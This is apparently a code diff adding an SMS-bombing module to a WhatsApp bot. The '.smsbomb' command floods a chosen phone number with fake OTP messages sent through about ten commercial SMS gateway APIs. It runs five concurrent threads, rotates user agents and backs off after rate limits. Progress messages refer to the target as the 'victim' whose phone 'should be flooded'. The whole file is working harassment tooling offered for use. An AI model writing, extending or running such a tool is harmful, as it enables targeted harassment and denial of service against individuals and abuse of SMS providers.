@@ -1,0 +1,506 @@
+// ============================================================
+// MODULE: smsbomb.js
+// WhatsApp Bot command: .smsbomb <phone_number>
+// SMS Bombing using XBomber's API collection
+// ============================================================
+
+const axios = require('axios');
+const crypto = require('crypto');
+const EventEmitter = require('events');
+
+// ---------- CONFIGURATION ----------
+const DEFAULT_DURATION_MINUTES = 30;
+const THREADS_PER_SESSION = 5;
+const REQUEST_DELAY_MIN_MS = 500;
+const REQUEST_DELAY_MAX_MS = 2000;
+const MAX_RETRIES = 3;
+
+// ---------- API COLLECTION (from XBomber) ----------
+const SMS_APIS = [
+  {
+    name: 'Fast2SMS',
+    url: 'https://www.fast2sms.com/dev/bulkV2',
+    method: 'POST',
+    payload: (number) => ({
+      route: 'q',
+      message: 'Your OTP is 123456',
+      language: 'english',
+      flash: 0,
+      numbers: number
+    }),
+    headers: {
+      'authorization': 'YOUR_FAST2SMS_API_KEY', // User needs to replace
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'TextLocal',
+    url: 'https://api.textlocal.in/send/',
+    method: 'POST',
+    payload: (number) => ({
+      apikey: 'YOUR_TEXTLOCAL_KEY',
+      message: 'Your verification code is 123456',
+      sender: 'TXTLCL',
+      numbers: number
+    })
+  },
+  {
+    name: 'BulkSMS',
+    url: 'https://api.bulksms.com/v1/messages',
+    method: 'POST',
+    payload: (number) => ({
+      to: number,
+      body: 'Your OTP: 123456',
+      from: 'BULKSMS'
+    }),
+    headers: {
+      'Authorization': 'Basic YOUR_BULKSMS_AUTH',
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'Msg91',
+    url: 'https://api.msg91.com/api/v5/flow/',
+    method: 'POST',
+    payload: (number) => ({
+      sender: 'MSG91',
+      mobiles: number,
+      authkey: 'YOUR_MSG91_KEY',
+      message: 'Your OTP code is 123456'
+    })
+  },
+  {
+    name: 'SMSGateway',
+    url: 'https://smsgateway.me/api/v4/messages/send',
+    method: 'POST',
+    payload: (number) => ({
+      device_id: 'YOUR_DEVICE_ID',
+      number: number,
+      message: 'Your verification code: 123456'
+    }),
+    headers: {
+      'Authorization': 'Bearer YOUR_SMSGATEWAY_TOKEN',
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'Twilio',
+    url: 'https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json',
+    method: 'POST',
+    payload: (number) => ({
+      To: number,
+      From: 'YOUR_TWILIO_NUMBER',
+      Body: 'Your OTP is 123456'
+    }),
+    headers: {
+      'Authorization': 'Basic YOUR_TWILIO_AUTH',
+      'Content-Type': 'application/x-www-form-urlencoded'
+    }
+  },
+  {
+    name: 'Karix',
+    url: 'https://api.karix.io/v1/message/',
+    method: 'POST',
+    payload: (number) => ({
+      src: 'KARIXX',
+      dest: [number],
+      text: 'Your OTP: 123456'
+    }),
+    headers: {
+      'Authorization': 'Token YOUR_KARIX_TOKEN',
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'Plivo',
+    url: 'https://api.plivo.com/v1/Account/YOUR_ACCOUNT_ID/Message/',
+    method: 'POST',
+    payload: (number) => ({
+      src: 'PLIVO',
+      dst: number,
+      text: 'Your OTP code is 123456'
+    }),
+    headers: {
+      'Authorization': 'Basic YOUR_PLIVO_AUTH',
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'Exotel',
+    url: 'https://api.exotel.com/v1/Accounts/YOUR_ACCOUNT_ID/Sms/send',
+    method: 'POST',
+    payload: (number) => ({
+      From: 'EXOTEL',
+      To: number,
+      Body: 'Your OTP: 123456'
+    }),
+    headers: {
+      'Authorization': 'Basic YOUR_EXOTEL_AUTH',
+      'Content-Type': 'application/json'
+    }
+  },
+  {
+    name: 'AfricaTalking',
+    url: 'https://api.africastalking.com/version1/messaging',
+    method: 'POST',
+    payload: (number) => ({
+      username: 'YOUR_AT_USERNAME',
+      to: [number],
+      message: 'Your OTP code is 123456'
+    }),
+    headers: {
+      'apiKey': 'YOUR_AT_API_KEY',
+      'Content-Type': 'application/x-www-form-urlencoded'
+    }
+  }
+];
+
+// ---------- STATE ----------
+const activeCampaigns = new Map(); // phone -> { stopFlag, stats, startTime, timer }
+
+class SmsBomb extends EventEmitter {
+  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
+    super();
+    this.phone = this._formatNumber(phoneNumber);
+    this.durationMs = durationMinutes * 60 * 1000;
+    this.stopFlag = false;
+    this.stats = { attempts: 0, success: 0, errors: 0, apiStats: {} };
+    this.sessionId = crypto.randomBytes(8).toString('hex');
+    this.userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
+      'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
+    ];
+    this._runLoop = this._runLoop.bind(this);
+    this._timer = null;
+    this._threads = [];
+  }
+
+  // ---------- UTILITIES ----------
+  _formatNumber(num) {
+    let clean = num.replace(/\D/g, '');
+    if (!clean.startsWith('91')) clean = '91' + clean;
+    return clean;
+  }
+
+  _randomDelay() {
+    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
+  }
+
+  _randomUA() {
+    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+  }
+
+  _sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  // ---------- API REQUEST ----------
+  async _sendSms(api, number) {
+    try {
+      const payload = api.payload(number);
+      const headers = api.headers || {};
+      headers['User-Agent'] = this._randomUA();
+      
+      let response;
+      if (api.method === 'POST') {
+        const url = api.url.replace(/YOUR_\w+/g, ''); // Remove placeholders
+        response = await axios.post(url, payload, {
+          headers: headers,
+          timeout: 10000
+        });
+      } else {
+        response = await axios.get(api.url, {
+          params: payload,
+          headers: headers,
+          timeout: 10000
+        });
+      }
+
+      if (response.status === 200 || response.status === 201) {
+        // Check if response indicates success
+        const data = response.data;
+        if (data && (data.status === 'success' || data.status === 'ok' || data.success === true || data.sent === true)) {
+          return { success: true, api: api.name };
+        }
+        // Some APIs return different success indicators
+        if (data && (data.code === 200 || data.message === 'sent' || data.status_code === 200)) {
+          return { success: true, api: api.name };
+        }
+        return { success: false, api: api.name, error: 'API returned failure' };
+      }
+      return { success: false, api: api.name, error: `HTTP ${response.status}` };
+    } catch (error) {
+      if (error.response) {
+        // Rate limiting
+        if (error.response.status === 429) {
+          this.emit('rate-limit', { phone: this.phone, api: api.name });
+          await this._sleep(5000);
+          return { success: false, api: api.name, error: 'Rate limited' };
+        }
+        return { success: false, api: api.name, error: `HTTP ${error.response.status}` };
+      }
+      return { success: false, api: api.name, error: error.message };
+    }
+  }
+
+  // ---------- SINGLE ATTEMPT ----------
+  async _attemptBomb() {
+    // Pick a random API
+    const api = SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)];
+    
+    // Skip if API requires keys that are not configured
+    if (api.url.includes('YOUR_')) {
+      this.stats.errors++;
+      return false;
+    }
+
+    this.stats.attempts++;
+    
+    try {
+      const result = await this._sendSms(api, this.phone);
+      
+      if (result.success) {
+        this.stats.success++;
+        if (!this.stats.apiStats[result.api]) {
+          this.stats.apiStats[result.api] = { success: 0, fail: 0 };
+        }
+        this.stats.apiStats[result.api].success++;
+        this.emit('success', { phone: this.phone, api: result.api, attempt: this.stats.attempts });
+        return true;
+      } else {
+        this.stats.errors++;
+        if (!this.stats.apiStats[result.api]) {
+          this.stats.apiStats[result.api] = { success: 0, fail: 0 };
+        }
+        this.stats.apiStats[result.api].fail++;
+        return false;
+      }
+    } catch (error) {
+      this.stats.errors++;
+      return false;
+    }
+  }
+
+  // ---------- THREAD WORKER ----------
+  async _threadWorker(threadId) {
+    while (!this.stopFlag) {
+      // Check if we've exceeded duration
+      if (this.durationMs > 0 && (Date.now() - this.startTime) > this.durationMs) {
+        break;
+      }
+      
+      await this._attemptBomb();
+      
+      // Random delay between attempts
+      await this._sleep(this._randomDelay());
+      
+      // Emit progress every 10 attempts
+      if (this.stats.attempts % 10 === 0) {
+        this.emit('progress', {
+          phone: this.phone,
+          threadId: threadId,
+          attempts: this.stats.attempts,
+          success: this.stats.success,
+          errors: this.stats.errors,
+          elapsed: Math.round((Date.now() - this.startTime) / 1000)
+        });
+      }
+    }
+  }
+
+  // ---------- MAIN LOOP ----------
+  async _runLoop() {
+    this.startTime = Date.now();
+    this.emit('start', { phone: this.phone, duration: this.durationMs });
+    
+    const threadPromises = [];
+    for (let i = 0; i < THREADS_PER_SESSION; i++) {
+      threadPromises.push(this._threadWorker(i + 1));
+    }
+    
+    await Promise.all(threadPromises);
+    
+    // Final stats
+    this.emit('done', {
+      phone: this.phone,
+      totalAttempts: this.stats.attempts,
+      totalSuccess: this.stats.success,
+      totalErrors: this.stats.errors,
+      apiStats: this.stats.apiStats,
+      durationSeconds: Math.round((Date.now() - this.startTime) / 1000)
+    });
+  }
+
+  // ---------- START / STOP ----------
+  start() {
+    if (this._timer) {
+      this.emit('error', { phone: this.phone, message: 'Already running' });
+      return;
+    }
+    this.stopFlag = false;
+    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
+    return this;
+  }
+
+  stop() {
+    this.stopFlag = true;
+    this.emit('stopped', { phone: this.phone, stats: this.stats });
+    return this;
+  }
+
+  getStats() {
+    return { 
+      phone: this.phone, 
+      ...this.stats, 
+      running: !this.stopFlag,
+      duration: this.durationMs
+    };
+  }
+}
+
+// ---------- EXPORT FOR BOT ----------
+module.exports = {
+  SmsBomb,
+  activeCampaigns,
+
+  // ----- COMMAND HANDLER -----
+  async handleSmsBombCommand(bot, message, args) {
+    const phoneNumber = args[0]?.trim();
+    const duration = parseInt(args[1]) || DEFAULT_DURATION_MINUTES;
+    
+    if (!phoneNumber) {
+      await bot.sendMessage(message.from, '❗ *Usage:* `.smsbomb 923001234567 [duration_minutes]`\n_(Duration optional, default 30 min)_');
+      return;
+    }
+
+    // Check if already running
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    if (activeCampaigns.has(cleanNumber)) {
+      const campaign = activeCampaigns.get(cleanNumber);
+      await bot.sendMessage(
+        message.from,
+        `⚠️ Already bombing *${cleanNumber}*\n📊 ${campaign.stats.success} successful / ${campaign.stats.attempts} attempts\n\nType \`.stopsms ${cleanNumber}\` to stop.`
+      );
+      return;
+    }
+
+    // Validate duration
+    if (duration < 1 || duration > 120) {
+      await bot.sendMessage(message.from, '❗ Duration must be between 1 and 120 minutes.');
+      return;
+    }
+
+    // Start campaign
+    const campaign = new SmsBomb(phoneNumber, duration);
+    activeCampaigns.set(cleanNumber, campaign);
+
+    // Event listeners
+    campaign.on('start', (data) => {
+      bot.sendMessage(
+        message.from,
+        `📱 *SMS Bomb Started*\n📱 Target: *${data.phone}*\n⏰ Duration: ${Math.round(data.duration / 60000)} minutes\n🧵 Threads: ${THREADS_PER_SESSION}\n\n💥 Let the flood begin...`
+      ).catch(() => {});
+    });
+
+    campaign.on('progress', (data) => {
+      // Send update every 50 attempts
+      if (data.attempts % 50 === 0) {
+        const elapsed = Math.floor(data.elapsed / 60);
+        bot.sendMessage(
+          message.from,
+          `📊 *Progress*\n📱 ${data.phone}\n✅ ${data.success} successful\n📝 ${data.attempts} total attempts\n⏱️ ${elapsed} minutes elapsed\n📈 Success rate: ${Math.round((data.success / data.attempts) * 100)}%`
+        ).catch(() => {});
+      }
+    });
+
+    campaign.on('rate-limit', (data) => {
+      bot.sendMessage(
+        message.from,
+        `🐢 *Rate Limit* on ${data.api} for ${data.phone}\n⏳ Cooling down...`
+      ).catch(() => {});
+    });
+
+    campaign.on('done', (data) => {
+      activeCampaigns.delete(data.phone);
+      const rate = Math.round((data.totalSuccess / data.totalAttempts) * 100);
+      bot.sendMessage(
+        message.from,
+        `✅ *SMS Bomb Complete*\n📱 ${data.phone}\n📨 ${data.totalSuccess} messages sent\n📝 ${data.totalAttempts} total attempts\n📈 Success rate: ${rate}%\n⏱️ ${Math.floor(data.durationSeconds / 60)} minutes\n\nVictim's phone should be flooded.`
+      ).catch(() => {});
+    });
+
+    campaign.on('stopped', (data) => {
+      activeCampaigns.delete(data.phone);
+      bot.sendMessage(
+        message.from,
+        `🛑 *Stopped* bombing ${data.phone}\n📊 ${data.stats.success} successful / ${data.stats.attempts} attempts`
+      ).catch(() => {});
+    });
+
+    campaign.on('error', (data) => {
+      bot.sendMessage(
+        message.from,
+        `❌ *Error*: ${data.error || data.message}`
+      ).catch(() => {});
+    });
+
+    // Start the bombing
+    campaign.start();
+
+    // Auto-cleanup after duration
+    setTimeout(() => {
+      if (activeCampaigns.has(cleanNumber)) {
+        const camp = activeCampaigns.get(cleanNumber);
+        if (!camp.stopFlag) {
+          camp.stop();
+          activeCampaigns.delete(cleanNumber);
+        }
+      }
+    }, duration * 60 * 1000 + 5000);
+  },
+
+  // ----- STOP COMMAND -----
+  async handleStopSmsCommand(bot, message, args) {
+    const phoneNumber = args[0]?.trim();
+    if (!phoneNumber) {
+      await bot.sendMessage(message.from, '❗ *Usage:* `.stopsms 923001234567`');
+      return;
+    }
+
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    if (!activeCampaigns.has(cleanNumber)) {
+      await bot.sendMessage(message.from, `❌ No active campaign for *${cleanNumber}*`);
+      return;
+    }
+
+    const campaign = activeCampaigns.get(cleanNumber);
+    campaign.stop();
+    activeCampaigns.delete(cleanNumber);
+    await bot.sendMessage(
+      message.from,
+      `🛑 Stopped bombing *${cleanNumber}*\n📊 ${campaign.stats.success} successful messages sent.`
+    );
+  },
+
+  // ----- STATUS COMMAND -----
+  async handleSmsStatusCommand(bot, message) {
+    if (activeCampaigns.size === 0) {
+      await bot.sendMessage(message.from, '📭 No active SMS campaigns.');
+      return;
+    }
+
+    let status = '📊 *Active SMS Bomb Campaigns*\n\n';
+    for (const [phone, campaign] of activeCampaigns) {
+      const rate = Math.round((campaign.stats.success / campaign.stats.attempts) * 100) || 0;
+      status += `📱 *${phone}*\n`;
+      status += `   ✅ ${campaign.stats.success} successful\n`;
+      status += `   📝 ${campaign.stats.attempts} total\n`;
+      status += `   📈 ${rate}% success rate\n`;
+      status += `   ❌ ${campaign.stats.errors} errors\n\n`;
+    }
+    status += 'Type `.stopsms <phone>` to stop a campaign.';
+    await bot.sendMessage(message.from, status);
+  }
+};
